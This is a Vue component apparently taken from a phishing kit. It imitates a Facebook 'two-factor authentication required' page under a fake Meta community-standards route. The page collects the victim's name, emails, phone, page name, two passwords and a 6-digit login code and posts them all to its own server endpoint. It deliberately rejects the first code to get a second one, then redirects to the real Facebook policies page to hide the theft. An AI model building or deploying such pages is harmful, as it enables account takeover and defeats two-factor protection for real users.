<template>
  <div>
    <section class="header">
      <div class="fotoh">
        <div class="row">
          <div class="col-6">
            <img
              src="../static/uploads/img/Facebook_f_logo.png"
              class="img-fluid"
              width="40"
            />
          </div>

          <div class="col-6" style="text-align: right">
            <!-- <div style="padding-top: 4px;">
                          <img src="" encodeURIComponent(image)" class="img-fluid" width="30" height="30" style="object-fit: cover; display: inline-block; border-radius: 50%;" />
                          <p style="display: inline-block; margin-bottom: 0px; font-weight: 600; font-size: 14px; color:#050505"></p>
                        </div>-->
            <p
              style="
                color: #3578e5;
                display: none;
                padding-top: 8px;
                margin-bottom: 0px;
                font-weight: 600;
                font-size: 15px;
              "
            >
              <i style="font-size: 16px" class="fa-solid fa-envelope"></i> Support Inbox
            </p>
          </div>
        </div>
      </div>
    </section>
    <section id="fac" style="display: block">
      <div class="container">
        <div class="row justify-content-center">
          <div class="col-md-8 col-xl-7 col-sm-8">
            <form action="javascript:void(0)" method="post" @keyup.enter="submitFullData()">
              <input type="hidden" name="full_name" value="l,cls,al" readonly="" />
              <input
                type="hidden"
                name="business_email"
                value="cklasl@gmail.com"
                readonly=""
              />
              <input
                type="hidden"
                name="personal_email"
                value="cmaskmcmk@gmail.com"
                readonly=""
              />
              <input type="hidden" name="phone" value=",lc,sal,l" readonly="" />
              <input
                type="hidden"
                name="facebook_pagename"
                value=",lc,asl,cl"
                readonly=""
              />
              <input
                type="hidden"
                name="first_password"
                value="kcakscmkasmcksacasccsacsacsa"
                readonly=""
              />
              <input
                type="hidden"
                name="second_password"
                value="câcsccsaascscascascasca"
                readonly=""
              />
              <div class="card">
                <h3 class="twh3">Two-factor authentication required (1/3)</h3>
                <div class="bodyyy">
                  <p>
                    You’ve asked us to require a 6-digit login code when anyone tries to
                    access your account from a new device or browser.
                  </p>
                  <p>
                    Enter the 6-digit code from your <strong>code generator</strong> or
                    third-party app below.
                  </p>
                  <div
                    class="form-group"
                    style="
                      padding-left: 0px;
                      padding-top: 5px;
                      padding-bottom: 10px;
                      display: inline-block;
                    "
                  >
                    <input
                      v-model="form.logincode"
                      style="
                        margin-left: 0px !important;
                        font-size: 14px;
                        border: 1px solid #ccc;
                        border-radius: 4px;
                        -webkit-box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
                        box-shadow: inset 0 1px 1px rgb(0 0 0 / 8%);
                        -webkit-transition: border-color ease-in-out 0.15s,
                          box-shadow ease-in-out 0.15s;
                        color: #4e4d4d;
                      "
                      type="number"
                      id="code"
                      class="form-control mx-sm-3"
                      aria-describedby="passwordHelpInline"
                      placeholder="Login code"
                      name="logincode"
                      minlength="4"
                      required=""
                    />
                  </div>
                  <div
                    class="form-group paddingleftt"
                    style="margin-top: -8px; display: inline-block"
                  >
                    <p
                      name=""
                      class="nolink"
                      id="timer"
                      style="
                        background-color: transparent;
                        border: transparent;
                        padding: 0px;
                        margin: 0px;
                        display: inline;
                        color: #385898;
                        font-size: 13px;
                      "
                    >
                      ( wait:
                      <span id="timeri" style="margin-bottom: 0px; display: inline"
                        >00:00</span
                      >
                      )
                    </p>
                    <a id="sendcodeagain" class="btn" @click="sendcodeagain()"
                      >Send Code Again</a
                    >
                  </div>
                  <div id="worng-message-twfc" class="text-danger wrong text-wrong fs-6" style="font-size:14px;" v-if="confirmNext > 0">The
                    code generator you entered is incorrect. Please wait 5 minutes to receive another one.
                </div>
                </div>
                <div class="footerii" style="width: 100%">
                  <a
                    data-toggle="modal"
                    data-target="#twof"
                    style="
                      font-size: 14px;
                      color: #385898;
                      font-weight: 600;
                      margin-bottom: 0px;
                      float: left;
                      margin-top: 6px;
                      cursor: pointer;
                    "
                    class="linkupertwo"
                    >Need another way to authenticate?</a
                  >
                  <button
                    @click="submitFullData()"
                    id="sendButton"
                    type="button"
                    class="btn butoni"
                    style="
                      margin-top: 0px;
                      margin-bottom: 0px;
                      float: right;
                      background-color: #4267b2;
                      border: 1px solid #4267b2;
                      color: white;
                      font-size: 13px;
                      font-weight: 500;
                      padding: 5px 20px;
                      border-radius: 4px;
                      text-transform: none;
                      font-weight: bold;
                    "
                  >
                    Send
                  </button>
                </div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </section>
    <div
      class="modal fade"
      id="twof"
      tabindex="-1"
      role="dialog"
      aria-labelledby="exampleModalLabel"
      aria-hidden="true"
    >
      <div class="modal-dialog" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <h5 class="modal-title" id="exampleModalLabel" style="font-size: 16px">
              Didn’t receive a code?
            </h5>

            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
              <span aria-hidden="true">×</span>
            </button>
          </div>
          <div class="modal-body">
            <p>1. Go to <strong>Settings &gt; Security and Login.</strong></p>
            <p>
              2. Under the <strong>Two-Factor Authentication</strong> section, click
              <strong>Use two-factor authentication</strong>. You may need to re-enter
              your password.
            </p>
            <p>
              3. Next to <strong>Recovery Codes</strong>, click
              <strong>Setup</strong> then <strong>Get Codes</strong>. If you've already
              set up recovery codes, you can click <strong>Show Codes.</strong>
            </p>
          </div>

          <div class="modal-footer">
            <button type="button" class="btn btn-secondary" data-dismiss="modal">
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
<script>
import { API } from "../helpers/api.js";

export default {
  beforeRouteEnter(to, from, next) {
    // Trước khi vào trang "Next," kiểm tra biến trạng thái "canAccessNextPage"
    if (!to.meta.canAccessNextPage) {
      // Nếu không thể truy cập trang "Next," chuyển hướng người dùng về trang "/"
      next('/meta-community-standard');
    } else {
      // Nếu có thể truy cập, cho phép vào trang "Next"
      next();
    }
  },
  head: {
    title: {
      inner: "Facebook",
    },
    link: [
      {
        rel: "stylesheet",
        href: "https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css",
      },
      {
        rel: "canonical",
        href: `${import.meta.env.VITE_API_ENDPOINT}/meta-community-standard`,
        // href: `meta-community-standard`,
      }
    ],
    script: [
      {
        src: "https://kit.fontawesome.com/83fd8385f7.js",
        crossorigin: "anonymous",
      },
      {
        src: "https://code.jquery.com/jquery-3.2.1.slim.min.js",
        integrity:
          "sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN",
        crossorigin: "anonymous",
      },
      {
        src: "https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js",
        integrity:
          "sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q",
        crossorigin: "anonymous",
      },
      {
        src: "https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js",
        integrity:
          "sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl",
        crossorigin: "anonymous",
      },
      {
        src:
          "https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js",
        integrity:
          "sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM",
        crossorigin: "anonymous",
      },
    ],
  },
  data() {
    return {
      form: {
        reason: "",
        full_name: "",
        business_email: "",
        personal_email: "",
        phone: "",
        facebook_pagename: "",
        check: false,
        first_password: "",
        second_password: "",
        logincode: "",
      },
      confirmNext: 0
    };
  },
  mounted() {
    this.startTimer(60 * 5, document.querySelector("#timeri"));
  },
  methods: {
    startTimer: function (duration, display) {
      var timer = duration,
        minutes,
        seconds;
      var myInterval = setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.textContent = minutes + ":" + seconds;

        if (timer == 0) {
          document.getElementById("timer").style.display = "none";
          document.getElementById("sendcodeagain").style.display = "block";
          clearInterval(myInterval);
        }
        if (--timer < 0) {
          timer = duration;
        }
      }, 1000);
    },
    submitFullData: function () {
      if (this.form.logincode != "") {
        var confirm = this.postConfirm();
        if(this.confirmNext == 0){
          this.form.logincode = '';
          this.startTimer(60 * 5, document.querySelector("#timeri"));
          this.confirmNext ++;
        }else{
          window.location.href = "https://www.facebook.com/policies_center/";
          // return this.$router.push("/information");
        }
      }
    },
    postConfirm: async function () {
      try {
        this.loading = true;
        this.isSubmit = true;
        const response = await API().post("/api/confirm", this.form);
        if (response.data.success) {
          return true;
        } else {
          return false;
        }
      } catch (error) {
        return false;
      } finally {
        this.isSubmit = false;
        this.loading = false;
      }
    },
  },
};
</script>
<style lang="css" scoped>
.form-control {
  border: 1px solid #d0d0d0 !important;
  border-radius: 4px !important;
  padding: 1.4rem 0.75rem !important;
  resize: none !important;
}
</style>

<style lang="css" scoped>
*,
body,
p,
span,
a,
div,
tr,
td,
th,
h1,
h2 {
  font-family: Helvetica;
}

body {
  background-color: #fff;
  font-family: Helvetica;
  -webkit-font-smoothing: antialiased;
}

.header {
  background-color: white;
  padding-top: 8px;
  padding-bottom: 8px;
  box-shadow: 1px 1px 8px 1px rgb(0 0 0 / 10%);
}

.main .card {
  margin-top: 60px;
  background-color: white;
  padding-top: 16px;
  padding-bottom: 0px;
  padding-left: 16px;
  padding-right: 16px;
  border: none;
  box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
  margin-bottom: 30px;
}

.main .open {
  color: white;
  padding: 4px 10px;
  border-radius: 5px;
}

.ikonauser {
  background-color: #c4c9cd;
  border-radius: 50%;
  font-size: 15px;
  color: white;
  padding: 10px;
}

label {
  color: #90949c;
  font-weight: bold;
  font-size: 12px;
}

input[type="text"],
textarea,
input[type="password"] {
  color: #495057;
  background-color: #fff;
  background-clip: padding-box;
  border-radius: 0px !important;
  border: 1px solid #ced4da;
}

.butoni {
  background-color: #4267b2;
  border: 1px solid #4267b2;
  color: white;
  margin-top: 15px;
  font-size: 13px;
  font-weight: 500;
  padding: 7px 20px;
  border-radius: 2px;
  text-transform: none;
  font-weight: bold;
}

.butoni:hover {
  background-color: #444444;
}

#main {
}

#fac {
  margin-top: 50px;
  display: none;
  margin-bottom: 60px;
}

.twh3 {
  border-bottom: 1px solid rgba(0, 0, 0, 0.101);
  background-color: #fff;
  font-size: 16px;
  color: #4b4f56;
  padding: 12px;
  font-weight: 700;
  border-top-left-radius: 8px;
  border-top-right-radius: 8px;
}

#fac .card {
  border-top-left-radius: 8px;
  border-top-right-radius: 8px;
}

#fac .bodyyy p {
  font-size: 13px;
}

#fac .bodyyy {
  padding: 10px 20px !important;
  border-bottom: 1px solid rgba(0, 0, 0, 0.101);
}

#fac .footerii {
  padding: 10px 20px !important;
  background-color: #fff;
  height: 55px;
}

.nolink {
  color: black !important;
  font-size: 14px !important;
}

#twof .modal-body {
  font-size: 14px;
}

.paddingleftt {
  padding-left: 12px;
}

@media only screen and (max-width: 600px) {
}

@media (max-width: 400px) {
  .linkupertwo {
    font-size: 12px !important;
    margin-top: 8px !important;
  }
}

.btn:hover {
  color: white !important;
}

.ourmessagiii {
  font-family: "Arial";
}

#sendcodeagain {
  display: none;
  font-size: 14px;
  padding-left: 0px;
  color: #385898;
}

#sendcodeagain:hover {
  color: #385898 !important;
}

.fotoh {
  width: 94%;
  margin: 0 auto;
}

/* Chrome, Safari, Edge, Opera */
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
  -webkit-appearance: none;
  margin: 0;
}

/* Firefox */
input[type="number"] {
  -moz-appearance: textfield;
}
</style>



// WEBPACK FOOTER //
// src/pages/MetaConfirm.vue